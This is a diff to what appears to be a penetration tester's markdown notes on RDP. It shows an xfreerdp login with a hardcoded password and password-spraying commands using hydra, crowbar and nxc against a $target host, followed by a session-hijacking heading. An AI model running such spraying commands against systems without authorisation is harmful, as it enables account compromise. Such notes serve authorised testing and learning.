@@ -23,8 +23,11 @@ xfreerdp /v:IP /u:Administrator /p:'87N1ns@slls83' /dynamic-resolution
 ```
 #### Password spraying
 ```bash
-hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
-crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+# port 3389
+hydra -L usernames.txt -p 'password123' $target rdp
+nxc rdp $target -u username.txt -p 'KS7X2M' --continue-on-success
+# The `/32` suffix indicates that the attack will be restricted strictly to that single IP address.
+crowbar -b rdp -s $target/32 -U users.txt -c 'password123'
 ```
 #### RDP Session Hijacking
 ![](Pasted%20image%2020261002102618.png)
